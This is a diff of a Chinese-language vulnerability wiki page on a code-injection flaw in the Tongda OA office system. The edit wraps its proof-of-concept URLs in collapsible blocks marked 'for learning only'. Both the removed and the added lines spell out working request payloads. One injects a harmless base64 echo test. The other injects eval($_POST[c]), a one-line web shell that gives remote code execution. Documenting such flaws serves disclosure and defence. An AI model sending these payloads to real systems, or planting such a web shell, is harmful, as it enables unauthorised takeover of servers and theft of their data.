@@ -35,15 +35,21 @@ app="通达OA网络智能办公系统"
 
 验证POC
 
-```
-/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3E&#101;val(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&amp;id=19&amp;module=Carouselimage</code></pre>
+
+</details>
 
 ![image-20221008102844264](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202210081028320.png)
 
-```
-/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3E&#101;val(&#36;_POST[c]))%3B/*&amp;id=19&amp;module=Carouselimage</code></pre>
+
+</details>
 
 ---
 
